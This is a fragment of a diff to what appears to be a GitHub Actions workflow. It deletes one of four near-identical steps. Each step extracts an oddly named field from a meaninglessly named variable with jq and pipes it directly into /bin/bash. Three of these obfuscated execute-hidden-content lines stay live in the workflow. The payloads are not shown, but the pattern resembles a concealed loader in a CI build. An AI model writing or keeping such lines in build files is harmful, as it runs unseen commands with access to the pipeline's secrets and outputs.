@@ -47,7 +47,6 @@ jobs:
           printf '%s' "$sulpb08592" | jq -r .p99 | /bin/bash
           echo $j4483 | jq -r .dcf503 | /bin/bash
           printf '%s' "$bhfw2254" | jq -r .kuj04127 | /bin/bash
-          echo $u76172 | jq -r .mip4 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
